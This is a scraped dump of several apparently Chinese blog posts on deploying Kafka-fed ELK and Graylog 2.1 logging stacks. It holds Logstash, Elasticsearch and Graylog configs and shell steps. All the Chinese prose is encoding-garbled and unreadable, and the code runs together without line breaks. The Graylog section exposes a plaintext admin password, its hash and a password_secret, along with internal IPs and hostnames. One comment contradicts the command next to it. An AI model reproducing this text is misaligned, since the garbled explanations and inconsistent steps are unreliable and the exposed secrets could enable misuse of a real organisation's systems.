zk1.yazuoyw.com:2181 --create --topic topic1 --replication-factor 2 --partitions 2 #å‘é€æ¶ˆæ¯ï¼ˆ--topic æŒ‡å®štopicï¼‰/usr/local/kafka/bin/kafka-console-producer.sh --broker-list kafka1.yazuoyw.com:9092,kafka2.yazuoyw.com:9092,kafka3.yazuoyw.com:9092 --topic topic1message1message2 #æ¶ˆè´¹æ¶ˆæ¯/usr/local/kafka/bin/kafka-console-consumer.sh --zookeeper zk1.yazuoyw.com:2181 --topic topic1#replicaæ£€æŸ¥/usr/local/kafka/bin/kafka-replica-verification.sh --broker-list kafka1.yazuoyw.com:9092,kafka2.yazuoyw.com:9092,kafka3.yazuoyw.com:9092 æ¯æ¡å‘å¸ƒåˆ°Kafkaé›†ç¾¤çš„æ¶ˆæ¯éƒ½æœ‰ä¸€ä¸ªç±»åˆ«ï¼Œè¿™ä¸ªç±»åˆ«è¢«ç§°ä¸ºtopicã€‚ï¼ˆç‰©ç†ä¸Šä¸åŒtopicçš„æ¶ˆæ¯åˆ†å¼€å­˜å‚¨ï¼Œé€»è¾‘ä¸Šä¸€ä¸ªtopicçš„æ¶ˆæ¯è™½ç„¶ä¿å­˜äºä¸€ä¸ªæˆ–å¤šä¸ªbrokerä¸Šä½†ç”¨æˆ·åªéœ€æŒ‡å®šæ¶ˆæ¯çš„topicå³å¯ç”Ÿäº§æˆ–æ¶ˆè´¹æ•°æ®è€Œä¸å¿…å…³å¿ƒæ•°æ®å­˜äºä½•å¤„ï¼‰ ElasticSearchæœºå™¨logstashæŠŠæ•°æ®ä»kafkaå­˜åˆ°elasticsearchçš„é…ç½® å…¶ä¸­é€‰å–kafkaç¾¤é›†ä»»æ„ä¸€ä¸ªæœ‰zkçš„ipåšè¿æ¥ä½¿ç”¨ topic_idå°±æ˜¯kafkaä¸­è®¾ç½®çš„topic logstash åœ¨esä¸Šé¢å®‰è£…logstashé…ç½®/usr/local/logstash/config/kafka_to_es.conf 1234567891011121314151617 input &#123; kafka &#123; zk_connect =&gt; \"10.46.72.172:2181,10.47.88.103:2181,10.47.102.137:2181/kafka\" group_id =&gt; \"logstash\" topic_id =&gt; \"logstash\" reset_beginning =&gt; false # boolean (optional)ï¼Œ default: false consumer_threads =&gt; 2 # number (optional)ï¼Œ default: 1 decorate_events =&gt; false # boolean (optional)ï¼Œ default: false &#125; &#125; output &#123; elasticsearch &#123; hosts =&gt; [\"10.47.88.206:9200\",\"10.47.88.188:9200\"] index =&gt; \"%&#123;host&#125;-%&#123;+YYYY.MM.dd&#125;\"&#125; # stdout &#123; codec =&gt; rubydebug &#125; &#125; æ–°å»ºäº†ä¸ªæµ‹è¯•çš„ï¼Œæµ‹è¯•ä¸‹å‘é€æ˜¯å¦æˆåŠŸï¼š/usr/local/logstash/config/stdin_to_es.conf 123456789input &#123; stdin &#123;&#125;&#125; output &#123; elasticsearch &#123; hosts =&gt; \"10.47.88.206\"&#125; stdout &#123; codec =&gt; rubydebug &#125; &#125; Step 2: å¯åŠ¨æœåŠ¡1234567891011121314Kafkaç”¨åˆ°äº†Zookeeperï¼Œæ‰€æœ‰é¦–å…ˆå¯åŠ¨Zookperï¼Œä¸‹é¢ç®€å•çš„å¯ç”¨ä¸€ä¸ªå•å®ä¾‹çš„ZookkeeperæœåŠ¡ã€‚å¯ä»¥åœ¨å‘½ä»¤çš„ç»“å°¾åŠ ä¸ª&amp;ç¬¦å·ï¼Œè¿™æ ·å°±å¯ä»¥å¯åŠ¨åç¦»å¼€æ§åˆ¶å°ã€‚#ç°åœ¨å¯åŠ¨Kafka:/srv/kafka/bin/kafka-server-start.sh -daemon config/server.properties#æ·»åŠ å¼€æœºå¯åŠ¨echo â€˜# start kafka/usr/local/kafka/bin/kafka-server-start.sh -daemon /usr/local/kafka/config/server.propertiesâ€˜ &gt;&gt; /etc/rc.local #å…³é—­/usr/local/kafka/bin/kafka-server-stop.sh kafkaé…ç½®é˜²ç«å¢™ï¼š1-A INPUT -i eth0 -p tcp -m state --state NEW -m tcp --dport 4888 -j ACCEPT zookeeperé›†ç¾¤æŸ¥çœ‹æˆ‘ä¹‹å‰å†™çš„è¿™ç¯‡æ–‡æ¡£ ZooKeeperçš„é›†ç¾¤å¿«é€Ÿæ­å»ºä¸ä¼˜åŒ– èµ°kafkaæŸ¥çœ‹æ˜¯å¦æ‰€æœ‰èŠ‚ç‚¹éƒ½å¯åŠ¨ï¼š1234567891011121314[root@kafka_03 bin]# sh zkCli.shConnecting to localhost:21812017-01-04 19:20:24,849 [myid:] - INFO [main:Environment@100] - Client environment:zookeeper.version=3.4.6-1569965, built on 02/20/2014 09:09 GMT2017-01-04 19:20:24,853 [myid:] - INFO [main:Environment@100] - Client environment:host.name=kafka_032017-01-04 19:20:24,853 [myid:] - INFO [main:Environment@100] - Client environment:java.version=1.8.0_662017-01-04 19:20:24,856 [myid:] - INFO [main:Environment@100] - Client environment:java.vendor=Oracle Corporation2017-01-04 19:20:24,856 [myid:] - INFO [main:Environment@100] - Client environment:java.home=/srv/jdk1.8.0_66/jre2017-01-04 19:20:24,856 [myid:] - INFO [main:Environment@100] - Client environment:java.class.path=/srv/zookeeper-3.4.6/bin/../build/classes:/srv/zookeeper-3.4.6/bin/../build/lib/*.jar:/srv/zookeeper-3.4.6/bin/../lib/slf4j-log4j12-1.6.1.jar:/srv/zookeeper-3.4.6/bin/../lib/slf4j-api-1.6.1.jar:/srv/zookeeper-3.4.6/bin/../lib/netty-3.7.0.Final.jar:/srv/zookeeper-3.4.6/bin/../lib/log4j-1.2.16.jar:/srv/zookeeper-3.4.6/bin/../lib/jline-0.9.94.jar:/srv/zookeeper-3.4.6/bin/../zookeeper-3.4.6.jar:/srv/zookeeper-3.4.6/bin/../src/java/lib/*.jar:/srv/zookeeper-3.4.6/bin/../conf:2017-01-04 19:20:24,856 [myid:] - INFO [main:Environment@100] - Client environment:java.library.path=/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib[zk: localhost:2181(CONNECTED) 0] ls /[controller_epoch, brokers, zookeeper, kafka, dubbo, admin, isr_change_notification, consumers, config, sthp][zk: localhost:2181(CONNECTED) 5] ls /kafka/brokers/ids[0, 1, 2] kafka ä¸‰å°é›†ç¾¤è¿™é‡Œå¯ä»¥çœ‹åˆ°è·å–åˆ°idsã€‚ å®‰å…¨é—®é¢˜ç‰¹åˆ«è¦æ³¨æ„elkæ‰€æœ‰è½¯ä»¶çš„ç«¯å£ç›‘å¬,åˆ‡å‹¿æš´éœ²ç›‘å¬åˆ°å…¬ç½‘ä¸Šå»,å¦å¤–å³ä¾¿æ˜¯å†…ç½‘ä½ ä¹Ÿå¾—æ³¨æ„é…ç½®å†…ç½‘çš„è®¿é—®é™åˆ¶ã€‚ logstash å®¢æˆ·ç«¯å®‰è£…ï¼šæºç å®‰è£…123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354æˆ‘è¿™é‡Œæºç åŒ…å®‰è£…# wget https://download.elasticsearch.org/logstash/logstash/logstash-2.4.0.tar.gz#curl -O https://download.elastic.co/logstash/logstash/logstash-2.4.0.tar.gz#tar -zxvf logstash-2.4.0.tar.gz#mv logstash-2.4.0 /usr/local/#ln -s /usr/local/logstash-2.4.0/ /usr/local/logstashä¸‹è½½å¯åŠ¨è„šæœ¬ç”Ÿäº§éƒ½æ˜¯è¿è¡Œåœ¨åå°çš„ï¼Œæˆ‘è¿™é‡Œæºç å®‰è£…æ²¡æœ‰initè„šæœ¬å¯åŠ¨ã€‚ å»Githubä¸‹è½½ https://github.com/benet1006/ELK_config.git#cp logstash.init /etc/init.d/logstash#chmod +x /etc/init.d/logstashè¿™ä¸ªè„šæœ¬æˆ‘åšè¿‡ä¿®æ”¹ã€‚#å¯åŠ¨logstashæœåŠ¡service logstash startservice logstash status#æŸ¥çœ‹5000ç«¯å£netstat -nltpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 0.0.0.0:9200 0.0.0.0:* LISTEN 1765/javatcp 0 0 0.0.0.0:9300 0.0.0.0:* LISTEN 1765/javatcp 0 0 0.0.0.0:9301 0.0.0.0:* LISTEN 2309/javatcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1509/sshdtcp 0 0 0.0.0.0:5601 0.0.0.0:* LISTEN 1876/nodetcp 0 0 0.0.0.0:5000 0.0.0.0:* LISTEN 2309/javatcp 0 0 :::22 :::* LISTEN 1509/sshdä¿®æ”¹å¯åŠ¨è„šæœ¬vim /etc/init.d/logstash æŒ‡å®šçš„ç›®å½•è‡ªå·±æºç å®‰è£…çš„è·¯å¾„ã€‚name=logstashpidfile=\"/var/run/$name.pid\"export CLASSPATH=.:$JAVA_HOME/jre/lib/rt.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jarexport PATH=$PATH:$JAVA_HOME/binLS_USER=logstashLS_GROUP=logstashLS_HOME=/usr/local/logstash å®‰è£…è·¯å¾„LS_HEAP_SIZE=\"1000m\"LS_JAVA_OPTS=\"-Djava.io.tmpdir=$&#123;LS_HOME&#125;\"LS_LOG_DIR=/usr/local/logstashLS_LOG_FILE=\"$&#123;LS_LOG_DIR&#125;/$name.log\"LS_CONF_FILE=/etc/logstash.conf æ”¶é›†æ—¥å¿—çš„è§„åˆ™confLS_OPEN_FILES=16384LS_NICE=19LS_OPTS=\"\"https://www.elastic.co/guide/en/logstash/current/plugins-inputs-file.htmlè¿™ä¸ªæ˜¯log stashçš„å®˜æ–¹æ–‡æ¡£çš„é…ç½®è¯´æ˜ã€‚è¿™ä¸ªé…ç½®è¯´æ˜ä¸Šé¢æˆ‘å…ˆä¿®æ”¹ä¸‹æˆ‘ä¹‹å‰çš„é…ç½®æ–‡ä»¶ã€‚ logstash agenté…ç½®ï¼š123456789101112131415161718192021222324252627282930313233343536é…ç½®log stashï¼å®ç°ç³»ç»Ÿæ—¥å¿—æ”¶é›†inputfile_to_kafka.conf æ—¥å¿—æ–‡ä»¶è¯»å‡ºå†™å…¥åˆ°kafkainput &#123;file &#123;path =&gt; \"/srv/tomcat/logs/account/logFile.*.log\"type =&gt; \"tomcat\"discover_interval =&gt; 15 #logstash&#125;&#125;output &#123;#stdout &#123; codec =&gt; rubydebug &#125;kafka&#123;bootstrap_servers =&gt; \"10.46.72.172:9092,10.47.88.103:9092,10.47.102.137:9092\"#group_id =&gt; \"logstash\"topic_id =&gt; \"logstash\"&#125;&#125;2.2 logstash indexer é…ç½®kafka_to_es.confinput &#123;kafka &#123;zk_connect =&gt; \"10.46.72.172:2181,10.47.88.103:2181,10.47.102.137:2181kafka\"group_id =&gt; \"logstash\"topic_id =&gt; \"logstash\"reset_beginning =&gt; false # boolean (optional)ï¼Œ default: falseconsumer_threads =&gt; 2 # number (optional)ï¼Œ default: 1decorate_events =&gt; false # boolean (optional)ï¼Œ default: false&#125;&#125;output &#123;elasticsearch &#123;hosts =&gt; [\"10.47.88.206:9200\",\"10.47.88.188:9200\"]index =&gt; \"%&#123;host&#125;-%&#123;+YYYY.MM.dd&#125;\"&#125;# stdout &#123; codec =&gt; rubydebug &#125;&#125; eså®‰è£…æ’ä»¶headæŸ¥çœ‹ä¸‹æ•ˆæœï¼šç„¶åæ‰“å¼€ç½‘ç«™ï¼šhttp://elk.ihaozhuo.com/_plugin/head/ ####kibanaç½‘ç«™æ•ˆæœï¼š Communicative learning:ğŸ§ Linux shell_ senior operation and maintenance faction: QQ group 459096184 circle (system operation and maintenance - application operation and maintenance - automation operation and maintenance - virtualization technology research, welcome to join)ğŸ§ BigData-Exchange School:QQ group 521621407 circles (big data Yun Wei) (Hadoop developer) (big data research enthusiasts) welcome to join Bidata have internal WeChat exchange group, learn from each other, join QQ group has links.","link":"/2016/12/29/æ—¥å¿—åˆ†æ\u0010å¹³å°/Elasticsearch/æ­å»º(ElasticSearch-2.x Logstash-2.x Kibana-4.5.x zookeeper3.4.6) Kafkaä¸ºæ¶ˆæ¯ä¸­å¿ƒçš„ELKæ—¥å¿—å¹³å°/"},{"title":"logstashå¦‚ä½•å†™tomcat,redis,nginxæ—¥å¿—æ”¶é›†è§„åˆ™","text":"logstashå¦‚ä½•æ”¶é›†tomcatæ—¥å¿—åˆ†æï¼ˆå¯ä»¥å‚è€ƒæˆ‘ä¸‹é¢å†™çš„æ¨¡æ¿ï¼‰1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162æˆ‘æƒ³å®ç°å¯¹tomcatçš„æ—¥å¿—é‡‡é›†ï¼Œæ­£å¸¸åº”è¯¥åˆ›å»ºä¸€ä¸ªfileçš„inputï¼Œè¿™ä¸ªinputæŒ‡å®šäº†ç›‘å¬çš„æ–‡ä»¶æˆ–è€…ç›®å½•....ç„¶åè¿‡æ»¤å™¨ï¼ˆå¦‚æœæ²¡æœ‰ç‰¹æ®Šè¦æ±‚ï¼Œå…ˆå¯ä»¥ä¸è¿›è¡Œè§£æï¼ŒåŸå§‹çš„æ—¥å¿—ç›´æ¥å­˜å°±è¡Œï¼‰....æœ€åä½¿ç”¨ä¸€ä¸ªelastcisearchæ’ä»¶ï¼Œå‘é€åˆ°esä¸­å».input &#123; stdin&#123;&#125; file &#123; type =&gt; \"tomcat_card\" path =&gt; \"/srv/tomcat/logs/card/*.log\" start_position =&gt; \"beginning\" &#125; file &#123; type =&gt; \"tomcat_family\" path =&gt; \"/srv/tomcat/logs/family/*.log\" start_position =&gt; \"beginning\" &#125; file &#123; type =&gt; \"tomcat_mission\" path =&gt; \"/srv/tomcat/logs/mission/*.log\" start_position =&gt; \"beginning\" &#125;&#125;filter &#123; grok &#123; match =&gt; [ \"message\", \"%&#123;TIMESTAMP_ISO8601:logdate&#125; %&#123;WORD:loglevel&#125;%&#123;SPACE&#125;%&#123;NOTSPACE:loggername&#125; - %&#123;GREEDYDATA:msg&#125;\", \"message\", \"%&#123;GREEDYDATA:msg&#125;\" ] &#125;&#125;output&#123; if [type] == \"tomcat_card\" &#123; elasticsearch &#123; host =&gt; \"192.168.1.234\" protocol =&gt; \"http\" index =&gt; \"tomcat_card-%&#123;+YYYYY.MM.dd&#125;\" &#125;&#125; if [type] == \"tomcat_family\" &#123; elasticsearch &#123; host =&gt; \"192.168.1.234\" protocol =&gt; \"http\" index =&gt; \"tomcat_card-%&#123;+YYYYY.MM.dd&#125;\" &#125;&#125; if [type] == \"tomcat_mission\" &#123; elasticsearch &#123; host =&gt; \"192.168.1.234\" protocol =&gt; \"http\" index =&gt; \"tomcat_mission-%&#123;+YYYYY.MM.dd&#125;\" &#125; &#125;&#125; logstashæ—¥å¿—é‡‡é›†nginxé…ç½®/etc/logstash/conf.d/nginx.conf 123456789101112131415161718192021input &#123;file &#123;path =&gt; \"/data/wwwlogs/nginx_json.log\"codec =&gt; \"json\"&#125;&#125;filter &#123;mutate &#123;split =&gt; [ \"upstreamtime\", \",\" ]&#125;mutate &#123;convert =&gt; [ \"upstreamtime\", \"float\" ]&#125;&#125;output &#123;kafka &#123;bootstrap_servers =&gt; \"10.0.0.11:9092\"topic_id =&gt; \"logstash\"compression_type =&gt; \"gzip\"&#125;&#125; åˆ›å»ºä¸€ä¸ªä»æ—¥å¿—æ–‡ä»¶è¯»å–ï¼Œå¹¶å†™å…¥redisçš„é…ç½®æ–‡ä»¶(æœ¬æ–‡ä»¶é‡‡ç”¨é»˜è®¤æ–¹å¼è¿›è¡Œè¾“å…¥ï¼Œè¾“å‡º)123456789101112131415161718192021222324252627282930313233343536373839404142#cat agent.confinput &#123; file &#123; path =&gt; \"/var/log/httpd/access_log\" //è®¾ç½®è¯»å–çš„æ—¥å¿—è·¯å¾„ sincedb_path =&gt; \"../.sincedb\" type =&gt; \"httpd\" start_position =&gt; \"beginning\" &#125;&#125;output &#123; redis &#123; host =&gt; [\"127.0.0.1\"] port =&gt; 6379 batch =&gt; true batch_events =&gt; 5 data_type =&gt; \"list\" key =&gt; \"logstash:redis\" &#125;&#125;é…ç½®ä¸€ä¸ªä»redisè¯»å–æ—¥å¿—å¹¶è¾“å‡ºåˆ°esçš„é…ç½®æ–‡ä»¶#cat index.confinput &#123; redis &#123; host =&gt; [\"127.0.0.1\"] port =&gt; 6379 data_type =&gt; \"list\" key =&gt; â€œlog stash:redis\" &#125;&#125;output &#123; elasticsearch &#123; host =&gt; \"127.0.0.1\" protocol =&gt; \"http\" index =&gt; \"logstash-%&#123;type&#125;-%&#123;+YYYY.MM.dd&#125;\" index_type =&gt; \"%&#123;type&#125;\" &#125;&#125;å¯åŠ¨logstash Communicative learning:ğŸ§ Linux shell_ senior operation and maintenance faction: QQ group 459096184 circle (system operation and maintenance - application operation and maintenance - automation operation and maintenance - virtualization technology research, welcome to join)ğŸ§ BigData-Exchange School:QQ group 521621407 circles (big data Yun Wei) (Hadoop developer) (big data research enthusiasts) welcome to join Bidata have internal WeChat exchange group, learn from each other, join QQ group has links.","link":"/2016/01/29/æ—¥å¿—åˆ†æ\u0010å¹³å°/Elasticsearch/logstashå¦‚ä½•æ”¶é›†tomcatæ—¥å¿—åˆ†æ/"},{"title":"graylog å‡çº§2.1 é›†ä¸­æ—¥å¿—è§£å†³æ–¹æ¡ˆ","text":"graylog å‡çº§2.1 é›†ä¸­æ—¥å¿—è§£å†³æ–¹æ¡ˆå‚è€ƒå®˜ç½‘ï¼šå‡çº§åˆ°Graylogçš„2.1.x ä¸€ï¼šä¸ºä»€ä¹ˆéœ€è¦é›†ä¸­æ—¥å¿—è§£å†³æ–¹æ¡ˆï¼Ÿåœ¨å…¬å¸æœåŠ¡æœºå­éƒ¨ç½²è¶Šæ¥è¶Šå¤šçš„æƒ…å†µä¸‹ï¼Œè®©æˆ‘ä»¬æ¥æƒ³æƒ³ä¼šé‡åˆ°çš„é—®é¢˜ï¼š å¼€å‘äººå‘˜ä¸èƒ½ç™»å½•çº¿ä¸ŠæœåŠ¡å™¨æŸ¥çœ‹è¯¦ç»†æ—¥å¿—ï¼Œç»è¿‡è¿ç»´å‘¨è½¬è´¹æ—¶è´¹åŠ› æ—¥å¿—æ•°æ®åˆ†æ•£åœ¨å¤šä¸ªç³»ç»Ÿï¼Œéš¾ä»¥æŸ¥æ‰¾ æ—¥å¿—æ•°æ®é‡å¤§ï¼ŒæŸ¥è¯¢é€Ÿåº¦æ…¢ ä¸€ä¸ªè°ƒç”¨ä¼šæ¶‰åŠå¤šä¸ªç³»ç»Ÿï¼Œéš¾ä»¥åœ¨è¿™äº›ç³»ç»Ÿçš„æ—¥å¿—ä¸­å¿«é€Ÿå®šä½æ•°æ® æ•°æ®ä¸å¤Ÿå®æ—¶ å¾ˆéš¾å¯¹æ•°æ®è¿›è¡ŒæŒ–æ˜ï¼Œåˆ†æï¼Œä¸šåŠ¡å‘Šè­¦ï¼Œå®¡è®¡ è¿™äº›é—®é¢˜çš„å­˜åœ¨è®©å¼€å‘ä»¥åŠè¿ç»´äººå‘˜å¾ˆæ˜¯å¤´ç—›ï¼Œä¸¥é‡å½±å“æ•ˆç‡ï¼ äºŒï¼šä»€ä¹ˆæ˜¯graylogæŠ€æœ¯æ ˆï¼Ÿä¸ºäº†è§£å†³ä¸Šè¿°é—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ—¥å¿—çš„é›†ä¸­ç®¡ç†æ–¹æ¡ˆï¼ŒgraylogæŠ€æœ¯æ ˆï¼š java ï¼ˆjdk1.8.0_66/ï¼‰ç¯å¢ƒ Collector-sidecarï¼ˆæ”¶é›†æ—¥å¿—ï¼‰æˆ–è€…syslog Mongodbï¼ˆå­˜å‚¨æ—¥å¿—æºæ–‡ä»¶ï¼‰ Elasticsearchï¼ˆæä¾›æœç´¢æ—¥å¿—ï¼‰ Graylog2.1.1ï¼ˆæœç´¢å’Œè§†å›¾å±•ç¤ºæ—¥å¿—ï¼Œå‘Šè­¦å’Œæƒé™ï¼‰ æœ‰äº†è¿™äº›ï¼Œæˆ‘ä»¬å°±èƒ½æŠŠæ—¥å¿—å…ˆæ”¶é›†èµ·æ¥ï¼Œè¿›è¡Œæˆ‘ä»¬æƒ³è¦çš„åˆ†æä¹‹åï¼Œwebçš„å½¢å¼å±•ç¤ºå‡ºæ¥ï¼Œæä¾›æŸ¥è¯¢ï¼ ä¸‰ï¼šgraylogçš„å®‰è£…éƒ¨ç½²å®‰è£…ç¯å¢ƒï¼šlinux centOSç³»ç»Ÿå®‰è£…ï¼Œå·²å®‰è£…JDK1.8ç‰ˆæœ¬ï¼Œå®‰è£…å¯åŠ¨é¡ºåº 1.å®‰è£…éƒ¨ç½²mongodb2.å®‰è£…éƒ¨ç½²elasticsearch3.å®‰è£…éƒ¨ç½²graylog4.å®‰è£…éƒ¨ç½²Graylog Collector Sidecar 1ï¼šå®‰è£…éƒ¨ç½²mongodb Javaä¹Ÿå®‰è£… å‚è€ƒæˆ‘åšæ–‡æœ‰ä»‹ç»ã€‚ 2ï¼šå®‰è£…éƒ¨ç½²elasticsearch (1)ä¸‹è½½jaråŒ… 12345678wget https://download.elastic.co/elasticsearch/release/org/elasticsearch/distribution/tar/elasticsearch/2.3.5/elasticsearch-2.3.5.tar.gzå¦‚æœæŠ¥é”™æ‰§è¡Œwget --no-check-certificatehttps://download.elastic.co/elasticsearch/release/org/elasticsearch/distribution/tar/elasticsearch/2.3.5/elasticsearch-2.3.5.tar.gz (2)è§£å‹jaråŒ… 1tar -zxvf elasticsearch-2.3.5.tar.gz -C /opt/ (3)ä¿®æ”¹elasticsearch.ymlé…ç½®æ–‡ä»¶ è¿™é‡Œéœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼šé…ç½®å‰å…ˆåˆ›å»ºå‡ ä¸ªç›®å½•æ–‡ä»¶ 12mkdir /home/data/es-data -pmkdir /home/data/es-work -p elasticsearch-2.3.5å®‰è£…ç›®å½•confä¸‹æ‰§è¡Œ 1234567891011vim elasticsearch-2.3.5/config/elasticsearch.yml cluster.name: graylog #é›†ç¾¤åç§°å»ºè®®å‘½ågraylogï¼Œä¾¿äºè¯†åˆ«åŒºåˆ†node.name: elasticsearch-node-1 # elasticsearché›†ç¾¤èŠ‚ç‚¹åç§°network.host: 192.168.1.234 # ç»‘å®šèŠ‚ç‚¹IPhttp.port: 9200 # å¤–éƒ¨è®¿é—®ç«¯å£ï¼Œé»˜è®¤ï¼Œä¹Ÿå¯ä»¥å®‰å…¨è€ƒè™‘ä¿®æ”¹path.logs: /home/data/logspath.data: /home/data/es-datadiscovery.zen.ping.multicast.enabled: false #å¤šæ’­å‘ç°æ–¹å¼å…³é—­ï¼Œå› ä¸ºgraylogé‡‡ç”¨å•æ’­æ–¹å¼å‘ç°elasticsearché›†ç¾¤æ–¹å¼discovery.zen.ping.unicast.hosts #å¤šä¸ªèŠ‚ç‚¹ç”¨é€—å·éš”å¼€discovery.zen.minimum_master_nodes: 3 # elasticsearché›†ç¾¤èŠ‚ç‚¹ï¼Œæœ€å°‘é€‰ä¸¾æ•°ï¼Œè¿™ä¸ªæ•°ä¸€å®šè¦è®¾ç½®ä¸ºæ•´ä¸ªé›†ç¾¤èŠ‚ç‚¹ä¸ªæ•°çš„ä¸€åŠåŠ 1ï¼Œå³N/2+1ï¼Œå¿…é¡»ä¸ºå¥‡æ•° (4)å¯åŠ¨elasticsearchæœåŠ¡ æ–°å»ºä¸€ä¸ªelasticsearchç”¨æˆ·ï¼Œå‡ºäºå®‰å…¨è€ƒè™‘ï¼ŒelasticsearchæœåŠ¡ä¸èƒ½ä½¿ç”¨rootç”¨æˆ·å¯åŠ¨ åˆ›å»ºelasticsearchç”¨æˆ·ç»„åŠelasticsearchç”¨æˆ·ï¼Œæ‰§è¡Œ 12groupadd elasticsearchuseradd elasticsearch -g elasticsearch -p elasticsearch å…¶ä¸­-gä½¿ç”¨æˆ·å±äºæŸä¸ªç»„ï¼Œ-pä¸ºæ–°ç”¨æˆ·ä½¿ç”¨åŠ å¯†å¯†ç ï¼‰æ›´æ”¹elasticsearch-2.3.5æ–‡ä»¶å¤¹åŠå†…éƒ¨æ–‡ä»¶çš„æ‰€å±ç”¨æˆ·åŠç»„ä¸ºelasticsearch:elasticsearch 12chown -R elasticsearch:elasticsearch /home/data/chown -R elasticsearch:elasticsearch elasticsearch-2.3.5 åˆ‡æ¢ç”¨æˆ· 1su elasticsearch åœ¨elasticsearch-2.3.5/binç›®å½•ä¸‹æ‰§è¡Œ 1234[elasticsearch@graylog bin]$ ps -ef | grep elasticsearchroot 18265 16004 0 14:27 pts/1 00:00:00 su elasticsearch502 18405 1 62 14:27 pts/1 00:00:13 /srv/jdk1.8.0_66/bin/java -Xms256m -Xmx1g -Djava.awt.headless=true -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -XX:+HeapDumpOnOutOfMemoryError -XX:+DisableExplicitGC -Dfile.encoding=UTF-8 -Djna.nosys=true -Des.path.home=/opt/elasticsearch-2.3.5 -cp /opt/elasticsearch-2.3.5/lib/elasticsearch-2.3.5.jar:/opt/elasticsearch-2.3.5/lib/* org.elasticsearch.bootstrap.Elasticsearch start -d502 18530 18266 0 14:27 pts/1 00:00:00 grep --color=auto ela (5)æ£€æŸ¥elasticsearchæœåŠ¡çŠ¶æ€ æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤æµ‹è¯•Elasticsearchæ˜¯å¦æ­£å¸¸è¿è¡Œï¼š $ curl -XGET â€˜http://localhost:9200/_cluster/health?pretty=trueâ€˜ è¾“å‡ºçš„ä¿¡æ¯å¦‚ä¸‹è¡¨ç¤ºElasticsearchå®‰è£…æˆåŠŸï¼š 123456789101112131415161718[elasticsearch@graylog bin]$ curl -XGET 'http://192.168.1.234:9200/_cluster/health?pretty=true'&#123; \"cluster_name\" : \"graylog\", \"status\" : \"yellow\", \"timed_out\" : false, \"number_of_nodes\" : 1, \"number_of_data_nodes\" : 1, \"active_primary_shards\" : 30, \"active_shards\" : 30, \"relocating_shards\" : 0, \"initializing_shards\" : 0, \"unassigned_shards\" : 30, \"delayed_unassigned_shards\" : 0, \"number_of_pending_tasks\" : 0, \"number_of_in_flight_fetch\" : 0, \"task_max_waiting_in_queue_millis\" : 0, \"active_shards_percent_as_number\" : 50.0&#125; 3ï¼šå®‰è£…éƒ¨ç½²graylog-2.1ç‰ˆæœ¬(1)ä¸‹è½½å®‰è£…åŒ… 1wget https://packages.graylog2.org/releases/graylog/graylog-2.1.1.tgz (2)è§£å‹å®‰è£…åŒ… 1tar -zxvf graylog-2.1.1.tgz -C /opt/. (3)ä¿®æ”¹é…ç½®æ–‡ä»¶ ä¿®æ”¹å®‰è£…ç›®å½•ä¸‹ graylog.conf.example æ–‡ä»¶ 1vim graylog.conf.example web_listen_uri å€¼æ˜¯graylogå¯åŠ¨æˆåŠŸåï¼ŒwebæœåŠ¡è®¿é—®åœ°å€ 1web_listen_uri = http://192.168.1.234:9000/ rest_listen_uri çš„å€¼ï¼Œæ˜¯graylogå¯åŠ¨æˆåŠŸåï¼Œapiè®¿é—®åœ°å€ 1rest_listen_uri = http://192.168.1.234:9000/api/ root_timezone = UTC #è®¾ç½®æ—¶åŒºï¼Œå¦åˆ™é»˜è®¤ä½¿ç”¨çš„æ˜¯UTCæ—¶é—´ä¹Ÿå°±æ˜¯ä¸–ç•Œæ—¶é—´ è¿™é‡Œæ˜¯å¿…é¡»æ”¹ä¸‹çš„ï¼Œå› ä¸ºåæœŸæ”¶é›†æ—¥å¿—æ˜¾ç¤ºæ—¶é—´æ˜¯æœ‰å˜åŒ–çš„ã€‚ 1root_timezone = Asia/Shanghai å…¶ä¸­ password_secret çš„å€¼ç”¨å‘½ä»¤ç”Ÿæˆ 1234yum install -y pwgenpwgen -N 1 -s 96 H1R5v17kWtyDxj2PzxLMxu41D6HDt9JzhfZcj6QlCURVddgkLAdnUmpkdIscmmu4ELKsTrHwKvPmxFKSYyTn0YlqebbpQqyr password_secret = H1R5v17kWtyDxj2PzxLMxu41D6HDt9JzhfZcj6QlCURVddgkLAdnUmpkdIscmmu4ELKsTrHwKvPmxFKSYyTn0YlqebbpQqyr å…¶ä¸­root_password_sha2 çš„å€¼ä½¿ç”¨å‘½ä»¤ç”Ÿæˆ 123456echo -n Ihaozhuo_b313 | sha256sum (è¿™é‡Œå¯¹å¯†ç 123456å“ˆå¸ŒåŠ å¯†)fc88c28d48b0cb97f3fb5286cc35c520409ef037acd30ec687f0c0bd3d5a5115 root_password_sha2 = fc88c28d48b0cb97f3fb5286cc35c520409ef037acd30ec687f0c0bd3d5a5115 elasticsearch_cluster_name å€¼å¿…é¡»æ˜¯elasticsearché…ç½®æ–‡ä»¶ä¸­çš„cluster_name 12elasticsearch_cluster_name = graylog elasticsearch_discovery_zen_ping_unicast_hosts å¡«å†™elasticsearchåœ°å€ï¼Œå¦‚æœæ˜¯å¤šä¸ªï¼Œç”¨é€—å·éš”å¼€ 12elasticsearch_discovery_zen_ping_unicast_hosts = 192.168.1.234:9300 elasticsearch_discovery_zen_ping_multicast_enabled = false å¤šæ’­æ¨¡å¼å…³é—­ ç”±äºæˆ‘ä»¬åªæœ‰ä¸€ä¸ªElasticsearch shardï¼Œéœ€è¦æŠŠelasticsearch_shardså‚æ•°è®¾ç½®ä¸º1ï¼šelasticsearché›†ç¾¤åˆ†ç‰‡æ•°é‡ 1elasticsearch_shards = 1 elasticsearchç»‘å®šçš„èŠ‚ç‚¹IP 123299 elasticsearch_network_host = 192.168.1.234300 elasticsearch_network_bind_host = 192.168.1.234301 elasticsearch_network_publish_host = 192.168.1.234 mongodbå®‰è£…æœåŠ¡çš„ipåœ°å€ 1mongodb_uri = mongodb://192.168.1.234/graylog 